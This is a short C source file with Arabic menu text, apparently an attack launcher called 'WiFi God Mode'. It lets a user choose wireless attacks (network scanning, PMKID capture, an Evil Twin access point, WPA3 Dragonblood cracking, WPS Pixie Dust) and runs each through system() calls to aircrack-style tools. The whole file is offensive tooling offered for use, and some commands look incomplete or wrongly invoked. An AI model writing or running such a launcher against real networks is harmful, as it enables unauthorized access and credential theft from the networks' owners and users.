/*
 * wifi_god.c - WiFi God Mode (WPA3, PMKID, WEP, WPS, Evil Twin, KARMA)
 * يعتمد على aircrack-ng المعدل و libpcap
 */
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>

void wifi_attack_menu(void) {
    int choice;
    printf("اختر نوع الهجوم:\n");
    printf("1. مسح الشبكات\n2. التقاط PMKID\n3. هجوم Evil Twin\n");
    printf("4. كسر WPA3 عبر Dragonblood\n5. هجوم WPS Pixie Dust\n");
    scanf("%d", &choice);
    switch(choice) {
        case 1: system("airodump-ng en0"); break;
        case 2: system("hcxdumptool -o pmkid.pcap -i en0 --enable_status=1"); break;
        case 3: system("hostapd evil_twin.conf & dnsmasq -C dnsmasq.conf"); break;
        case 4: system("dragonblood_exploit -i en0"); break;
        case 5: system("pixiewps -i en0"); break;
        default: printf("خيار غير صحيح\n");
    }
}
